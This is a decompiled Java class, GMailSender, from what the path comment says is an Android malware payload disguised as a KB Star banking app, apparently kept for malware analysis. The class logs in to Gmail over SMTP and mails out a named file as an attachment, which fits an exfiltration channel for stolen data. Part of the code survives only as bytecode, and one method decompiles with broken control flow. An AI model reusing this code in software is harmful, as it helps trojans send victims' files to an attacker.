package com.kbstar.kb.android.star.util;

import android.util.Log;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.Security;
import java.util.Properties;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.mail.Authenticator;
import javax.mail.Message.RecipientType;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class GMailSender
  extends Authenticator
{
  private String mailhost = "smtp.gmail.com";
  private String password;
  private Session session;
  Url u = new Url();
  private String user;
  
  static
  {
    Security.addProvider(new JSSEProvider());
  }
  
  public GMailSender(String paramString1, String paramString2)
  {
    this.user = paramString1;
    this.password = paramString2;
    paramString1 = new Properties();
    paramString1.setProperty("mail.transport.protocol", "smtp");
    paramString1.setProperty("mail.host", this.mailhost);
    paramString1.put("mail.smtp.auth", "true");
    paramString1.put("mail.smtp.port", "465");
    paramString1.put("mail.smtp.socketFactory.port", "465");
    paramString1.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
    paramString1.put("mail.smtp.socketFactory.fallback", "false");
    paramString1.setProperty("mail.smtp.quitwait", "false");
    this.session = Session.getDefaultInstance(paramString1, this);
  }
  
  protected PasswordAuthentication getPasswordAuthentication()
  {
    return new PasswordAuthentication(this.user, this.password);
  }
  
  /* Error */
  public void sendMail(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6)
    throws Exception
  {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: new 103	javax/mail/internet/MimeMessage
    //   5: dup
    //   6: aload_0
    //   7: getfield 89	com/kbstar/kb/android/star/util/GMailSender:session	Ljavax/mail/Session;
    //   10: invokespecial 106	javax/mail/internet/MimeMessage:<init>	(Ljavax/mail/Session;)V
    //   13: astore 7
    //   15: new 108	javax/activation/DataHandler
    //   18: dup
    //   19: new 6	com/kbstar/kb/android/star/util/GMailSender$ByteArrayDataSource
    //   22: dup
    //   23: aload_0
    //   24: aload_2
    //   25: invokevirtual 114	java/lang/String:getBytes	()[B
    //   28: ldc 116
    //   30: invokespecial 119	com/kbstar/kb/android/star/util/GMailSender$ByteArrayDataSource:<init>	(Lcom/kbstar/kb/android/star/util/GMailSender;[BLjava/lang/String;)V
    //   33: invokespecial 122	javax/activation/DataHandler:<init>	(Ljavax/activation/DataSource;)V
    //   36: astore_2
    //   37: aload 7
    //   39: new 124	javax/mail/internet/InternetAddress
    //   42: dup
    //   43: aload_3
    //   44: invokespecial 127	javax/mail/internet/InternetAddress:<init>	(Ljava/lang/String;)V
    //   47: invokevirtual 131	javax/mail/internet/MimeMessage:setSender	(Ljavax/mail/Address;)V
    //   50: aload 7
    //   52: aload_1
    //   53: invokevirtual 134	javax/mail/internet/MimeMessage:setSubject	(Ljava/lang/String;)V
    //   56: aload 7
    //   58: aload_2
    //   59: invokevirtual 138	javax/mail/internet/MimeMessage:setDataHandler	(Ljavax/activation/DataHandler;)V
    //   62: aload 4
    //   64: bipush 44
    //   66: invokevirtual 142	java/lang/String:indexOf	(I)I
    //   69: ifle +99 -> 168
    //   72: aload 7
    //   74: getstatic 148	javax/mail/Message$RecipientType:TO	Ljavax/mail/Message$RecipientType;
    //   77: aload 4
    //   79: invokestatic 152	javax/mail/internet/InternetAddress:parse	(Ljava/lang/String;)[Ljavax/mail/internet/InternetAddress;
    //   82: invokevirtual 156	javax/mail/internet/MimeMessage:setRecipients	(Ljavax/mail/Message$RecipientType;[Ljavax/mail/Address;)V
    //   85: new 158	java/io/File
    //   88: dup
    //   89: aload 6
    //   91: aload 5
    //   93: invokespecial 159	java/io/File:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   96: astore_2
    //   97: new 161	javax/mail/internet/MimeBodyPart
    //   100: dup
    //   101: invokespecial 162	javax/mail/internet/MimeBodyPart:<init>	()V
    //   104: astore_1
    //   105: new 164	javax/activation/FileDataSource
    //   108: dup
    //   109: aload_2
    //   110: invokespecial 167	javax/activation/FileDataSource:<init>	(Ljava/io/File;)V
    //   113: astore_2
    //   114: aload_1
    //   115: new 108	javax/activation/DataHandler
    //   118: dup
    //   119: aload_2
    //   120: invokespecial 122	javax/activation/DataHandler:<init>	(Ljavax/activation/DataSource;)V
    //   123: invokevirtual 168	javax/mail/internet/MimeBodyPart:setDataHandler	(Ljavax/activation/DataHandler;)V
    //   126: aload_1
    //   127: aload_2
    //   128: invokevirtual 172	javax/activation/FileDataSource:getName	()Ljava/lang/String;
    //   131: invokevirtual 175	javax/mail/internet/MimeBodyPart:setFileName	(Ljava/lang/String;)V
    //   134: new 177	javax/mail/internet/MimeMultipart
    //   137: dup
    //   138: ldc -77
    //   140: invokespecial 180	javax/mail/internet/MimeMultipart:<init>	(Ljava/lang/String;)V
    //   143: astore_2
    //   144: aload_2
    //   145: aload_1
    //   146: invokevirtual 184	javax/mail/internet/MimeMultipart:addBodyPart	(Ljavax/mail/BodyPart;)V
    //   149: aload 7
    //   151: aload_2
    //   152: invokevirtual 188	javax/mail/internet/MimeMessage:setContent	(Ljavax/mail/Multipart;)V
    //   155: aload 7
    //   157: invokevirtual 191	javax/mail/internet/MimeMessage:saveChanges	()V
    //   160: aload 7
    //   162: invokestatic 197	javax/mail/Transport:send	(Ljavax/mail/Message;)V
    //   165: aload_0
    //   166: monitorexit
    //   167: return
    //   168: aload 7
    //   170: getstatic 148	javax/mail/Message$RecipientType:TO	Ljavax/mail/Message$RecipientType;
    //   173: new 124	javax/mail/internet/InternetAddress
    //   176: dup
    //   177: aload 4
    //   179: invokespecial 127	javax/mail/internet/InternetAddress:<init>	(Ljava/lang/String;)V
    //   182: invokevirtual 201	javax/mail/internet/MimeMessage:setRecipient	(Ljavax/mail/Message$RecipientType;Ljavax/mail/Address;)V
    //   185: goto -100 -> 85
    //   188: astore_1
    //   189: ldc -53
    //   191: aload_1
    //   192: invokevirtual 206	java/lang/Exception:getMessage	()Ljava/lang/String;
    //   195: aload_1
    //   196: invokestatic 212	android/util/Log:e	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    //   199: pop
    //   200: goto -35 -> 165
    //   203: astore_1
    //   204: aload_0
    //   205: monitorexit
    //   206: aload_1
    //   207: athrow
    //   208: astore_3
    //   209: aload_3
    //   210: invokevirtual 215	javax/mail/MessagingException:printStackTrace	()V
    //   213: goto -87 -> 126
    //   216: astore_2
    //   217: aload_2
    //   218: invokevirtual 215	javax/mail/MessagingException:printStackTrace	()V
    //   221: goto -87 -> 134
    //   224: astore_1
    //   225: aload_1
    //   226: invokevirtual 215	javax/mail/MessagingException:printStackTrace	()V
    //   229: goto -80 -> 149
    //   232: astore_1
    //   233: aload_1
    //   234: invokevirtual 215	javax/mail/MessagingException:printStackTrace	()V
    //   237: goto -82 -> 155
    //   240: astore_1
    //   241: aload_1
    //   242: invokevirtual 215	javax/mail/MessagingException:printStackTrace	()V
    //   245: goto -85 -> 160
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	248	0	this	GMailSender
    //   0	248	1	paramString1	String
    //   0	248	2	paramString2	String
    //   0	248	3	paramString3	String
    //   0	248	4	paramString4	String
    //   0	248	5	paramString5	String
    //   0	248	6	paramString6	String
    //   13	156	7	localMimeMessage	MimeMessage
    // Exception table:
    //   from	to	target	type
    //   2	85	188	java/lang/Exception
    //   85	114	188	java/lang/Exception
    //   114	126	188	java/lang/Exception
    //   126	134	188	java/lang/Exception
    //   134	144	188	java/lang/Exception
    //   144	149	188	java/lang/Exception
    //   149	155	188	java/lang/Exception
    //   155	160	188	java/lang/Exception
    //   160	165	188	java/lang/Exception
    //   168	185	188	java/lang/Exception
    //   209	213	188	java/lang/Exception
    //   217	221	188	java/lang/Exception
    //   225	229	188	java/lang/Exception
    //   233	237	188	java/lang/Exception
    //   241	245	188	java/lang/Exception
    //   2	85	203	finally
    //   85	114	203	finally
    //   114	126	203	finally
    //   126	134	203	finally
    //   134	144	203	finally
    //   144	149	203	finally
    //   149	155	203	finally
    //   155	160	203	finally
    //   160	165	203	finally
    //   168	185	203	finally
    //   189	200	203	finally
    //   209	213	203	finally
    //   217	221	203	finally
    //   225	229	203	finally
    //   233	237	203	finally
    //   241	245	203	finally
    //   114	126	208	javax/mail/MessagingException
    //   126	134	216	javax/mail/MessagingException
    //   144	149	224	javax/mail/MessagingException
    //   149	155	232	javax/mail/MessagingException
    //   155	160	240	javax/mail/MessagingException
  }
  
  public void sendMail1(String paramString1, String paramString2, String paramString3, String paramString4)
    throws Exception
  {
    for (;;)
    {
      try
      {
        localMimeMessage = new MimeMessage(this.session);
        paramString2 = new DataHandler(new ByteArrayDataSource(paramString2.getBytes(), "text/plain"));
        localMimeMessage.setSender(new InternetAddress(paramString3));
        localMimeMessage.setSubject(paramString1);
        localMimeMessage.setDataHandler(paramString2);
        if (paramString4.indexOf(',') <= 0) {
          continue;
        }
        localMimeMessage.setRecipients(Message.RecipientType.TO, InternetAddress.parse(paramString4));
        Transport.send(localMimeMessage);
      }
      catch (Exception paramString1)
      {
        MimeMessage localMimeMessage;
        Log.e("SendMail", paramString1.getMessage(), paramString1);
        continue;
      }
      finally {}
      return;
      localMimeMessage.setRecipient(Message.RecipientType.TO, new InternetAddress(paramString4));
    }
  }
  
  public class ByteArrayDataSource
    implements DataSource
  {
    private byte[] data;
    private String type;
    
    public ByteArrayDataSource(byte[] paramArrayOfByte)
    {
      this.data = paramArrayOfByte;
    }
    
    public ByteArrayDataSource(byte[] paramArrayOfByte, String paramString)
    {
      this.data = paramArrayOfByte;
      this.type = paramString;
    }
    
    public String getContentType()
    {
      if (this.type == null) {
        return "application/octet-stream";
      }
      return this.type;
    }
    
    public InputStream getInputStream()
      throws IOException
    {
      return new ByteArrayInputStream(this.data);
    }
    
    public String getName()
    {
      return "ByteArrayDataSource";
    }
    
    public OutputStream getOutputStream()
      throws IOException
    {
      throw new IOException("Not Supported");
    }
    
    public void setType(String paramString)
    {
      this.type = paramString;
    }
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/util/GMailSender.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */